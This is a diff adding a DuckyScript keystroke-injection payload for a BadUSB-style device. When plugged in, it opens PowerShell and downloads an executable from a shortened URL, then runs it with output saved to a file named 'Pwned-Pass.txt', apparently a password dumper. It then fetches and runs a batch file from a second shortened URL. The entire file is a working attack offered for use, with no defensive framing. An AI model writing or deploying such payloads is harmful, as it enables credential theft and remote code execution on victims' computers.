@@ -1,0 +1,26 @@
+DELAY 1000
+CTRL W
+DELAY 100
+GUI R
+DELAY 100
+STRING powershell
+DELAY 100
+ENTER
+DELAY 1000
+STRING cd $env:TEMP
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest 'https://tinyurl.com/5ybbuyfu' -OutFile m.exe
+ENTER
+DELAY 15000
+STRING .\m.exe > Pwned-Pass.txt
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest 'https://tinyurl.com/mr2eddpt' -OutFile d.bat
+ENTER
+DELAY 1000
+STRING .\d.bat
+ENTER
+DELAY 3000
+STRING exit
+ENTER
